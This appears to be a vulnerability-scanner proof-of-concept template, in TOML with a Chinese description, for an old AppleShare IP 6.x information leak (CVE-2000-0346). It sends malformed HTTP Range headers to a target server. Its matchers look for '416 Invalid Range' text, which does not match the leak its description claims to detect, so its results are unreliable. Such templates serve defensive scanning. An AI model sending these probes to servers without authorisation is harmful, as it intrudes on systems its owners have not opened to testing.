[info]
author = "AVE"
description = "通过发送格式错误的 HTTP Range 请求头，检测 AppleShare IP 6.x Web 服务器是否存在信息泄露漏洞。若服务器返回异常文件内容或目录列表，则存在漏洞。"
id = "POC-AVE-2000-0351"
name = "AppleShare IP 6.x 无效 Range 请求信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-0351"]
vuln_id = [
    "CVE-2000-0346",
    "AVE-2000-0351",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Range = "bytes=0--1"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "416",
    "Invalid",
    "Range",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Range = "bytes=99999999999999999999"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "416",
    "Invalid",
    "Range",
]
